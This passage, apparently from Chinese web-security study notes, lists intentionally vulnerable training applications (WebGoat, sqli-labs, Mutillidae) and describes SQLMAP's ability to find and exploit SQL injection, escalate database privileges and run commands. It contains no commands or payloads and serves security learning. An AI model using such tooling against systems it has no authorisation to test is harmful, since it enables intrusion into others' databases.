- WebGoat 是由著名的OWASP负责维护的一个漏洞百出的J2EE Web应用程序，这些漏洞并非程序中的bug，而是故意设计用来讲授Web应用程序安全课程的。这个应用程序提供了一个逼真的教学环境，为用户完成课程提供了有关的线索。https://owasp.org/www-project-webgoat/
- Sqli Lab ​  支持报错注入、二次注入、盲注、Update注入、Insert注入、Http头部注入、二次注入练习等。支持GET和POST两种方式。https://github.com/Audi-1/sqli-labs
- Mutillidae 是一个免费、开源的Web应用程序，提供专门被允许的安全测试和入侵的Web应用程序。其中包含了丰富的渗透测试项目，如SQL注入、跨站脚本、clickjacking、本地文件包含、远程代码执行等。https://github.com/webpwnized/mutillidae

### SQL注入漏洞扫描工具

- [x] SQLMAP被称为“SQL注入第一神器”，开放源代码，可以 **自动探测和利用SQL注入漏洞及接管数据库服务器**
- [x] 其主要功能是 `扫描、发现并利用` 给定的URL和SQL注入漏洞，其广泛的功能和选项包括数据库指纹、枚举、数据库提权、访问目标文件系统，并在获取操作权限时执行任意命令
